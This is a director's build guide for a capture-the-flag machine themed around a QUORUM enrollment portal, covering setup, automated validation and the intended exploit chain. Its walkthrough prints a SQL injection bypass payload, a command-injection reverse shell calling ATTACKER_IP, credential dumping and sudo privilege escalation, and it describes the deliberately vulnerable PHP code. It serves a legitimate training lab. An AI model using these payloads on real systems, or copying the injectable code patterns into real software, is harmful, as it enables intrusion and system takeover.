# AM-01: The Lobby Terminal — Director Build Guide

> **EYES ONLY — DIRECTORS.** This document contains the full exploit
> chain. Do not distribute to players. Player-facing material is in
> `PLAYER_BRIEF.md`.

## Overview

| | |
|---|---|
| Difficulty | Easy |
| Source shape | VulnHub SkyTower (reskinned — see `../../AM_SOURCING.md`) |
| Services | HTTP (80), SSH (22) |
| Intended path | SQLi auth bypass → command injection → DB cred dump → SSH → sudo privesc |
| CP | User 150, Root 200 |
| Flags | `DZ{user_lobby_<hash>}`, `DZ{root_lobby_<hash>}` (per-event) |
| Lore | Fragment A — pre-QUORUM enrollment record in the DB |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-01_lobby_terminal

# Mint per-event flags (from the Anomaly_Machines/ root):
cd ../ && ./generate_flags.sh && cd AM-01_lobby_terminal

# Set the flags as env vars for compose (override the placeholders):
export AM01_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-01: The Lobby Terminal — User Flag'])")"
export AM01_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-01: The Lobby Terminal — Root Flag'])")"

# Build and start:
docker compose up -d --build
docker compose logs -f
```

The container publishes:
- `80:80` — Apache + PHP enrollment portal
- `2222:22` — OpenSSH (login as `compliance` after recovering the cred)

**Note:** if you also run other AMs on the same host, AM-01 owns host
port 22. Later AMs use `2222`, `2223`, etc. (see the top-level
`Anomaly_Machines/README.md` port map).

### Running without minted flags (dev/test)

The compose file ships placeholder flags (`DZ{user_lobby_PLACEHOLDER}`).
The container will run, but flag validation against the scoring engine
won't match. For a quick local smoke test, the placeholders are fine.

---

## Exploit Chain — Full Walkthrough

Target: `http://localhost` (or the VPN-side IP `10.10.1.10` in production).

### Stage 1 — Enumerate

```bash
nmap -sV -sC localhost
# 80/tcp  open  http    Apache httpd (Enrollment Portal)
# 22/tcp  open  ssh     OpenSSH
```

### Stage 2 — SQLi auth bypass

The login form at `/app/index.php` concatenates user input directly into:

```sql
SELECT * FROM citizens WHERE username='$user' AND password='$pass'
```

Bypass with a classic payload:

```
Username: ' OR 1=1 -- -
Password: x
```

This lands on `/app/dashboard.php` authenticated. The dashboard shows
the first matching citizen row.

### Stage 3 — Second-order command injection

The dashboard's "Update Contact Email" form posts `email` into:

```php
exec("echo '" . $email . "' | /usr/sbin/sendmail -t");
```

Inject a reverse shell:

```
email = '; bash -c "bash -i > /dev/tcp/ATTACKER_IP/4444 0>&1" #
```

Catch it:

```bash
nc -lvnp 4444    # on attacker
```

You now have a shell as `www-data`.

### Stage 4 — DB cred discovery + login table dump

`www-data` can read `/var/www/html/app/config.php` (mode 640, owned
`www-data`). It contains the MariaDB app creds:

```bash
cat /var/www/html/app/config.php
# $db_user = 'lobby_app'; $db_pass = 'lobby_app_sql_pass_2026';
```

Connect and dump the `login` table:

```bash
mysql -u lobby_app -p'lobby_app_sql_pass_2026' lobby -e 'SELECT * FROM login;'
# +----+------------+--------------------------------+
# | id | username   | password                       |
# +----+------------+--------------------------------+
# |  1 | compliance | WinterCaseSensitiveShallNotPass! |
# +----+------------+--------------------------------+
```

### Stage 5 — SSH lateral + user flag

```bash
sshpass -p 'WinterCaseSensitiveShallNotPass!' ssh -p 2222 compliance@localhost
cat ~/user.txt
# DZ{user_lobby_<hash>}
```

### Stage 6 — sudo privesc

```bash
sudo -l
# User compliance may run the following commands:
#     (ALL) NOPASSWD: /usr/local/bin/run_audit.sh
```

The script is world-writable (intentional misconfig — "Directors may
update the audit tool"):

```bash
ls -l /usr/local/bin/run_audit.sh
# -rwxrwxrwx 1 root root ... /usr/local/bin/run_audit.sh
```

Overwrite it to dump the root flag and run via sudo:

```bash
echo '#!/bin/bash
cat /root/root.txt' > /usr/local/bin/run_audit.sh
sudo /usr/local/bin/run_audit.sh
# DZ{root_lobby_<hash>}
```

### Stage 7 — Lore Fragment A (optional, for THE RESTORATION / THE FOUNDERS)

Dump the `citizens` table and look for the archived pre-QUORUM record:

```bash
mysql -u lobby_app -p'lobby_app_sql_pass_2026' lobby \
  -e "SELECT username, notes FROM citizens WHERE username='record_pre_quorum_001';"
```

The `notes` field contains Fragment A — a recovered survey-team log
entry stating the surface is habitable, contradicting QUORUM's official
position.

---

## Validation (automated)

Run the exploit-chain test suite from the repo root:

```bash
cd Anomaly_Machines/AM-01_lobby_terminal
docker compose --profile test up --build --abort-on-container-exit
```

Or run the test runner manually against an already-running AM-01:

```bash
docker build -t dz-test-runner ../_test_runner
cd ../  # Anomaly_Machines/
./generate_flags.sh
docker run --rm --network host \
  -v "$(pwd):/machines:ro" \
  dz-test-runner am-01 localhost /machines/event_flags.json
```

Expected output: `PASS: N  FAIL: 0` and `QUORUM has reviewed this audit.
Compliance is confirmed.`

---

## Hardcoded values (per-event changes)

If you change any of these, update both `entrypoint.sh` and `init_db.sql`:

| Value | Where | Notes |
|---|---|---|
| `COMPLIANCE_SSH_PASSWORD` | `entrypoint.sh` | Must match the `login` table row in `init_db.sql` |
| `lobby_app` DB password | `init_db.sql` + `app/config.php` | The cred players find by reading `config.php` |
| `AM01_USER_FLAG` / `AM01_ROOT_FLAG` | env vars (compose) | Minted by `generate_flags.sh` |

---

## Reskinning notes (vs. source SkyTower box)

- Hostname → `lobby-terminal`, MOTD → QUORUM flavor
- Web app → "QUORUM Citizen Enrollment Portal" (was SkyTower corporate)
- DB schema → `citizens` / `login` (Construct-themed)
- SSH restricted-shell quirk → **dropped** (plain `ssh compliance@host` gives a normal bash shell); difficulty lives in the two injection points + DB cred discovery
- Lore Fragment A planted in the `citizens` table (THE RESTORATION faction objective)